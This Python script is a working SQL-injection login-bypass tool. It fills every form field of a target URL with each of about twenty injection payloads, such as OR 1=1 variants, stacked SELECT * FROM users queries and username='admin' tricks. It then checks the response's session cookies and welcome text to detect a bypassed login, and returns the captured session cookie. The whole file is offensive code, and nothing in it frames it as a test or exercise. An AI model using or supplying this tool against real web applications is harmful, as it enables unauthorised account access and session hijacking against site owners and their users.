import requests
import re

def send_sql_injection_request(url, formDataNames):
    sqli_payloads = [
        '\' || 1=1 # ',
        '\'; SELECT * FROM users LIMIT 0, 1 -- ',
        '"; SELECT * FROM users LIMIT 0, 1 -- ',
        '\'); SELECT * FROM users LIMIT 0, 1 -- ',
        '"); SELECT * FROM users LIMIT 0, 1 -- ',
        '\' OR 1=1 -- ',
        '\') OR 1=1 -- ',
        '") OR 1=1 -- ',
        '" OR 1=1 -- ',
        '\' || 1=\'1',
        '" || 1="1',
        '") || 1=")1',
        '\') || 1=\')1',
        '\' || username="admin" -- ',
        '\') || username="admin" -- ',
        '") || username="admin" -- ',
        '" || username="admin" -- ',
        '" || 1=1 # ',
        '") || 1=1 # ',
        '\') || 1= 1 # ',
    ]

    for sqli_payload in sqli_payloads:
        print(f"Trying payload: {sqli_payload}")
        try:
            formData = {}
            for name in formDataNames:
                if name:
                    formData[name] = sqli_payload

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            with requests.Session() as session:
                response = session.post(url, data=formData)
                print("Response status code:", response.status_code)
                print("Response content:", response.content)
                responseCookies = {'PHPSESSID': requests.utils.dict_from_cookiejar(session.cookies)['PHPSESSID']}
                print("Response cookies:", responseCookies)
            responseBody = response.content.decode('utf-8')
            print("Response body:", responseBody)

            cookieRegex = r'(?:PHPSESSID|JSESSIONID|ASP.NET_SessionId|sessionid|rails_session|connect.sid|sid|Token|AuthCookie)=([^;]+)'
            bodyRegex = r"(?:Welcome|Hello|Logged in|User|Dashboard|Home)[\w\s,!:]{10,100}"
            if not responseCookies:
                print("No cookies found in response.")
                continue;

            bodyMatches = re.findall(bodyRegex, responseBody)
            print("Body matches:", bodyMatches)
            print("Response cookies:", responseCookies)
            cookieName = ''
            if responseCookies:
                for cookie_name, cookie_value in responseCookies.items():
                    cookieName = cookie_name
                    cookie = f"{cookie_name}={cookie_value}"
                    cookieMatches = re.findall(cookieRegex, cookie)
                print('Cookie matches:', cookieMatches)
                print(f"Cookie Key: {cookieName}")
                if cookieMatches and bodyMatches:
                    return {cookieName: cookieMatches}
                return False
        except Exception as e:
            print('Error sending POST request:', e)

    return False